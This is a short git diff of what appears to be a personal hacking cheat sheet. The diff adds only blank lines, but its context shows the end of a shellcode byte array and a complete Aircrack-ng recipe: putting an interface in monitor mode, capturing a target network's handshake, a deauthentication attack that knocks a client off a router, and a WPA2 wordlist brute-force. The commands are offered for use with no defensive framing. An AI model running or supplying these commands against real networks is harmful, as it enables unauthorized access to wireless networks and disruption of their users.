@@ -27,6 +27,8 @@ char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
 e389c189c2b00b
 cd8031c040cd80
 
+
+
 // Aircrack-ng
 ifconfig
 airmon-ng start [interface]
@@ -34,8 +36,10 @@ airmon-ng start [interface]
 airodump-ng [interface]
 airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
 
+
 // Deauth Attack
 aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
+
 
 // Aircrack Bruteforce
 aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
